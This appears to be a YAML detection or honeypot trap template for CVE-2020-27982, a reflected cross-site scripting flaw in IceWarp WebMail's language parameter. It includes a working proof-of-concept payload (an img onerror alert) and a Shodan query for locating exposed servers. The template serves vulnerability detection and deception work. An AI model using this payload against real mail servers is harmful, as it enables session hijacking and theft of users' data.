id: CVE-2020-27982
info:
  name: IceWarp WebMail 11.4.5.0 - Cross-Site Scripting
  author: madrobot
  description: IceWarp WebMail 11.4.5.0 is vulnerable to cross-site scripting via
    the language parameter.
  severity: medium
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary JavaScript code in the context of the victim''s browser, leading
    to session hijacking, defacement, or theft of sensitive information.

    '
  remediation: 'Apply the latest security patch or upgrade to a non-vulnerable version
    of IceWarp WebMail.

    '
  reference:
  - https://packetstormsecurity.com/files/159763/Icewarp-WebMail-11.4.5.0-Cross-Site-Scripting.html
  - https://cxsecurity.com/issue/WLB-2020100161
  - https://nvd.nist.gov/vuln/detail/CVE-2020-27982
  - http://packetstormsecurity.com/files/159763/Icewarp-WebMail-11.4.5.0-Cross-Site-Scripting.html
  - https://github.com/ARPSyndicate/cvemon
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cve-id: CVE-2020-27982
    cwe-id: CWE-79
    epss-score: 0.00178
    epss-percentile: 0.55072
    cpe: cpe:2.3:a:icewarp:mail_server:11.4.5:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: icewarp
    product: mail_server
    shodan-query: title:"icewarp"
  tags: cve,cve2020,xss,icewarp,packetstorm
traps:
- request:
    method: GET
    path: /webmail/?language=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
    headers: null
    body: null
  response:
    status_code: 200
    headers:
      VulTrap: text/html
    body: <img src=x onerror=alert(1)>
